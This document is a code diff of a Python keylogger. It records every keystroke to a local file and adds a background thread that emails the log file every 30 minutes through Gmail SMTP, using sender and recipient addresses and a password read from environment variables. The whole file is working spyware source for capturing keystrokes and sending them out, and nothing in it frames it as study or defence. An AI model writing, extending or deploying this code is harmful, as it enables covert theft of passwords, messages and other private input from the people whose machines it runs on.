@@ -1,190 +1,214 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import time
+import os
+import threading
 
-def write_to_file(key):
-    letter = str(key)
-    letter = letter.replace("'", "")
-
-    # if letter in ["Key.ctrl_l", "Key.ctrl_r", "Key.shift", "Key.shift_r", "Key.alt_l", "Key.alt_gr"]:
-    #     letter = ""
-    if letter == "Key.ctrl_l":
-        letter = " (Left Ctrl) "
-    elif letter == "Key.ctrl_r":
-        letter = " (Right Ctrl) "
-    elif letter == "Key.shift":
-        letter = " (Left Shift) "
-    elif letter == "Key.shift_r":
-        letter = " (Right Shift) "
-    elif letter == "Key.alt_l":
-        letter = " (Left Alt) "
-    elif letter == "Key.alt_gr":
-        letter = " (Right Alt) "
-    elif letter == "Key.space":
-        letter = " "
-    elif letter == "Key.enter":
-        letter = "\n"
-    elif letter == "Key.backspace":
-        letter = " (Backspace) "
-    elif letter == "Key.cmd":
-        letter = " (Windows) "
-    elif letter == "Key.tab":
-        letter = " (Tab) "
-    elif letter == "Key.caps_lock":
-        letter = " (Caps Lock) "
-    elif letter == "Key.num_lock":
-        letter = " (Num Lock) "
-    elif letter == "Key.scroll_lock":
-        letter = " (Scroll Lock) "
-    elif letter == "Key.esc":
-        letter = " (Esc) "
-    elif letter == "Key.delete":
-        letter = " (Delete) "
-    elif letter == "Key.print_screen":
-        letter = " (Print Screen) "
-    elif letter == "Key.home":
-        letter = " (Home) "
-    elif letter == "Key.insert":
-        letter = " (Insert) "
-    elif letter == "Key.end":
-        letter = " (End) "
-    elif letter == "Key.page_up":
-        letter = " (Page Up) "
-    # elif letter == "Key.page_down":
-    #     letter = " (Page Down) "
-    elif letter == "Key.menu":
-        letter = " (Menu) "
-
+# Dictionary mapping keys to human-readable strings
+key_map = {
+    "Key.ctrl_l": " (Left Ctrl) ",
+    "Key.ctrl_r": " (Right Ctrl) ",
+    "Key.shift": " (Left Shift) ",
+    "Key.shift_r": " (Right Shift) ",
+    "Key.alt_l": " (Left Alt) ",
+    "Key.alt_gr": " (Right Alt) ",
+    "Key.space": " (Space) ",
+    "Key.enter": "\n",
+    "Key.backspace": " (Backspace) ",
+    "Key.cmd": " (Windows) ",
+    "Key.tab": " (Tab) ",
+    "Key.caps_lock": " (Caps Lock) ",
+    "Key.num_lock": " (Num Lock) ",
+    "Key.scroll_lock": " (Scroll Lock) ",
+    "Key.esc": " (Esc) ",
+    "Key.delete": " (Delete) ",
+    "Key.print_screen": " (Print Screen) ",
+    "Key.home": " (Home) ",
+    "Key.insert": " (Insert) ",
+    "Key.end": " (End) ",
+    "Key.page_up": " (Page Up) ",
+    # "Key.page_down": " (Page Down) ",
+    "Key.menu": " (Menu) ",
+    
     # Media Keys
-    elif letter == "Key.media_volume_up":
-        letter = " (Volume Up) "
-    elif letter == "Key.media_volume_down":
-        letter = " (Volume Down) "
-    elif letter == "Key.media_volume_mute":
-        letter = " (Volume Mute) "
-    elif letter == "Key.pause":
-        letter = " (Pause) "
-
+    "Key.media_volume_up": " (Volume Up) ",
+    "Key.media_volume_down": " (Volume Down) ",
+    "Key.media_volume_mute": " (Volume Mute) ",
+    "Key.pause": " (Pause) ",
+    
     # Directions
-    elif letter == "Key.left":
-        letter = " (Left Arrow) "
-    elif letter == "Key.right":
-        letter = " (Right Arrow) "
-    elif letter == "Key.up":
-        letter = " (Up Arrow) "
-    elif letter == "Key.down":
-        letter = " (Down Arrow) "
-
+    "Key.left": " (Left Arrow) ",
+    "Key.right": " (Right Arrow) ",
+    "Key.up": " (Up Arrow) ",
+    "Key.down": " (Down Arrow) ",
+    
     # Function Keys
-    elif letter == "Key.f1":
-        letter = " (F1) "
-    elif letter == "Key.f2":
-        letter = " (F2) "
-    elif letter == "Key.f3":
-        letter = " (F3) "
-    elif letter == "Key.f4":
-        letter = " (F4) "
-    elif letter == "Key.f5":
-        letter = " (F5) "
-    elif letter == "Key.f6":
-        letter = " (F6) "
-    elif letter == "Key.f7":
-        letter = " (F7) "
-    elif letter == "Key.f8":
-        letter = " (F8) "
-    elif letter == "Key.f9":
-        letter = " (F9) "
-    elif letter == "Key.f10":
-        letter = " (F10) "
-    elif letter == "Key.f11":
-        letter = " (F11) "
-    elif letter == "Key.f12":
-        letter = " (F12) "
-    elif letter == "Key.f24":
-        letter = " (F24) "
-
+    "Key.f1": " (F1) ",
+    "Key.f2": " (F2) ",
+    "Key.f3": " (F3) ",
+    "Key.f4": " (F4) ",
+    "Key.f5": " (F5) ",
+    "Key.f6": " (F6) ",
+    "Key.f7": " (F7) ",
+    "Key.f8": " (F8) ",
+    "Key.f9": " (F9) ",
+    "Key.f10": " (F10) ",
+    "Key.f11": " (F11) ",
+    "Key.f12": " (F12) ",
+    "Key.f24": " (F24) ",
+    
     # Numbers
-    elif letter == "<96>":
-        letter = "0"
-    elif letter == "<97>":
-        letter = "1"
-    elif letter == "<98>":
-        letter = "2"
-    elif letter == "<99>":
-        letter = "3"
-    elif letter == "<100>":
-        letter = "4"
-    elif letter == "<101>":
-        letter = "5"
-    elif letter == "<102>":
-        letter = "6"
-    elif letter == "<103>":
-        letter = "7"
-    elif letter == "<104>":
-        letter = "8"
-    elif letter == "<105>":
-        letter = "9"
-    elif letter == "<110>":
-        letter = "."
-
+    "<96>": " 0 ",
+    "<97>": " 1 ",
+    "<98>": " 2 ",
+    "<99>": " 3 ",
+    "<100>": " 4 ",
+    "<101>": " 5 ",
+    "<102>": " 6 ",
+    "<103>": " 7 ",
+    "<104>": " 8 ",
+    "<105>": " 9 ",
+    "<110>": " . ",
+    
     # Key Combinations
-    elif letter == "\x01":
-        letter = " (Ctrl + A) "
-    elif letter == "\x02":
-        letter = " (Ctrl + B) "
-    elif letter == "\x03":
-        letter = " (Ctrl + C) "
-    elif letter == "\x04":
-        letter = " (Ctrl + D) "
-    elif letter == "\x05":
-        letter = " (Ctrl + E) "
-    elif letter == "\x06":
-        letter = " (Ctrl + F) "
-    elif letter == "\x07":
-        letter = " (Ctrl + G) "
-    elif letter == "\x08":
-        letter = " (Ctrl + H) "
-    elif letter == "\t":
-        letter = " (Ctrl + I) "
-    elif letter == "\n":
-        letter = " (Ctrl + J) "
-    elif letter == "\x0b":
-        letter = " (Ctrl + K) "
-    elif letter == "\x0c":
-        letter = " (Ctrl + L) "
-    elif letter == "\r":
-        letter = " (Ctrl + M) "
-    elif letter == "\x0e":
-        letter = " (Ctrl + N) "
-    elif letter == "\x0f":
-        letter = " (Ctrl + O) "
-    elif letter == "\x10":
-        letter = " (Ctrl + P) "
-    elif letter == "\x11":
-        letter = " (Ctrl + Q) "
-    elif letter == "\x12":
-        letter = " (Ctrl + R) "
-    elif letter == "\x13":
-        letter = " (Ctrl + S) "
-    elif letter == "\x14":
-        letter = " (Ctrl + T) "
-    elif letter == "\x15":
-        letter = " (Ctrl + U) "
-    elif letter == "\x16":
-        letter = " (Ctrl + V) "
-    elif letter == "\x17":
-        letter = " (Ctrl + W) "
-    elif letter == "\x18":
-        letter = " (Ctrl + X) "
-    elif letter == "\x19":
-        letter = " (Ctrl + Y) "
-    elif letter == "\x1a":
-        letter = " (Ctrl + Z) "
+    "\x01": " (Ctrl + A) ",
+    "\x02": " (Ctrl + B) ",
+    "\x03": " (Ctrl + C) ",
+    "\x04": " (Ctrl + D) ",
+    "\x05": " (Ctrl + E) ",
+    "\x06": " (Ctrl + F) ",
+    "\x07": " (Ctrl + G) ",
+    "\x08": " (Ctrl + H) ",
+    "\t": " (Ctrl + I) ",
+    "\n": " (Ctrl + J) ",
+    "\x0b": " (Ctrl + K) ",
+    "\x0c": " (Ctrl + L) ",
+    "\r": " (Ctrl + M) ",
+    "\x0e": " (Ctrl + N) ",
+    "\x0f": " (Ctrl + O) ",
+    "\x10": " (Ctrl + P) ",
+    "\x11": " (Ctrl + Q) ",
+    "\x12": " (Ctrl + R) ",
+    "\x13": " (Ctrl + S) ",
+    "\x14": " (Ctrl + T) ",
+    "\x15": " (Ctrl + U) ",
+    "\x16": " (Ctrl + V) ",
+    "\x17": " (Ctrl + W) ",
+    "\x18": " (Ctrl + X) ",
+    "\x19": " (Ctrl + Y) ",
+    "\x1a": " (Ctrl + Z) ",
+}
 
+# Function to write key presses to a file
+def write_to_file(key):
+    letter = str(key).replace("'", "")
+
+    # Use the dictionary to get the corresponding letter or use the key itself if not found
+    letter = key_map.get(letter, letter) # Default to the key itself if not found in map
+
+    # Write to file (with exception handling)
+    try:
+        with open("Keys123.txt", "a") as f:
+            f.write(letter)
+    except Exception as e:
+        print(f"Error writing to file: {e}")
+    
     # Stopping the script
-    elif letter == "Key.page_down":
-        return False
+    if letter == "Key.page_down":
+        print("Stopping keylogging !!")
+        return False  # Stop the listener
 
-    with open("log.txt", "a") as f:
-        f.write(letter)
+# Rotate the file: rename it with a timestamp and clear it for future use
+# def rotate_file(file_path):
+#     timestamp = time.strftime("%Y%m%d_%H%M%S")  # Get the current timestamp
+#     new_file_name = f"Keys123_{timestamp}.txt"  # Construct a new name with the timestamp
 
-with Listener(on_press=write_to_file) as l:
-    l.join()
+#     try:
+#         # Rename the file with the timestamp
+#         os.rename(file_path, new_file_name)
+#         print(f"File rotated. Old file renamed to {new_file_name}")
+
+#         # Clear the original file for future use (create a new empty file)
+#         with open(file_path, 'w'): pass  # This opens and immediately closes the file, effectively clearing it
+#         print(f"Original file {file_path} cleared for future use.")
+#     except Exception as e:
+#         print(f"Error rotating file: {e}")
+
+# def rotate_file_if_needed(file_path):
+#     max_size = 10 * 1024 * 1024  # 10 MB
+#     if os.path.getsize(file_path) > max_size:
+#         rotate_file(file_path)
+
+# Email sending function
+def send_email(file_path):
+    # Check if the file size exceeds the threshold and rotate if needed
+    # rotate_file_if_needed(file_path)
+    # Check if the file exists and has content
+    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+        # Set up the email details
+        # from_email = "xxx@gmail.com"  # Replace with your email
+        from_email = os.getenv("FROM_EMAIL")  # Replace in environment variable
+        # to_email = "yyy@gmail.com"  # Replace with recipient email
+        to_email = os.getenv("TO_EMAIL")  # Replace in environment variable
+        subject = "Automated Key File"
+        body = "Please find the attached file."
+
+        # Create the email container
+        msg = MIMEMultipart()
+        msg['From'] = from_email
+        msg['To'] = to_email
+        msg['Subject'] = subject
+
+        # Attach the email body
+        msg.attach(MIMEText(body, 'plain'))
+
+        # Attach the file
+        with open(file_path, 'rb') as attachment:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f"attachment; filename={file_path}")
+            msg.attach(part)
+
+        # Set up the SMTP server (example for Gmail)
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()  # Secure the connection
+            # server.login(from_email, "Pass@123")  # Replace with your email password
+            server.login(from_email, os.getenv("EMAIL_PASSWORD")) # Replace in environment variable
+            text = msg.as_string()
+            server.sendmail(from_email, to_email, text)
+            server.quit()
+            print("Email sent successfully.")
+            # After sending the email, rotate the file to clear it for future use
+            # rotate_file(file_path)
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+    else:
+        print("File is empty or does not exist, not sending email.")
+
+# Function to send the file every x minutes
+def send_file_every_x_minutes(file_path):
+    while True:
+        send_email(file_path)  # Send the email with the file
+        time.sleep(1800)  # Wait for 30 minutes (1800 seconds)
+
+# Start the keylogger listener
+listener = Listener(on_press=write_to_file)
+listener.start()
+
+# Start sending the email every x minutes in the background using a separate thread
+email_thread = threading.Thread(target=send_file_every_x_minutes, args=("Keys123.txt",))
+email_thread.daemon = True # Daemonize the email thread so it exits when the main program exits
+email_thread.start()
+
+# Keep the program running indefinitely to continue listening for keypresses
+try:
+    while True:
+        time.sleep(0.1)  # Keeps the program alive, allowing both threads to run
+except KeyboardInterrupt:
+    print("Program terminated.")
